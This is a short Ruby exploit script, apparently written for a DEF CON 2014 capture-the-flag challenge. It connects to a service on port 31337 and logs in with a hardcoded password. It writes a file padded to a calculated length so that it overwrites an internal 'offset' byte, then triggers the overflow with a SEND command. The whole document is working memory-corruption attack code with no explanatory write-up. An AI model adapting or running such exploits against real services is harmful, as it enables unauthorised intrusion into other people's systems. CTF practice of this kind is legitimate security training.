require 'socket'

#s = TCPSocket.new("shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me", 31337)

def create_file(size)
  file = File.open("/tmp/test", "w")
  0.upto(size - 1) do |i|
    file.write(i.chr)
  end
  file.close
end

def create_evil(size)
  padding = calc_size(size)

  puts("We need 0x%x bytes of padding!" % padding)

  file = File.open("/tmp/test", "w")
  file.write("A" * padding)

  # This writes to the 'offset'
  file.write((padding).chr + "\x02")
  file.write("B" * 0x08)
  file.close
end

# Gets the first byte of the size
def calc_size(size)
  eax = size
  edx = size + 0xf
  eax = 0x10
  eax -= 1
  eax += edx
  var_390 = 0x10
  edx = 0
  eax = eax / var_390
  eax *= 0x10

  return eax + 0x1c
end

# If the file starts at 10 bytes, the 0x3d'th byte overwrites the first byte of 'offset'
size = ARGV[0].to_i
create_file(size)

#create_evil(10)
s = TCPSocket.new("localhost", 31337)
puts(s.recv(1024))
s.puts("PASS defcon2014")
puts(s.recv(1024))


s.puts("RETR /tmp/test")
puts(s.recv(1024))

puts("Press enter")
#$stdin.gets()

create_evil(size)
s.puts("SEND")

puts(s.recv(10000000))
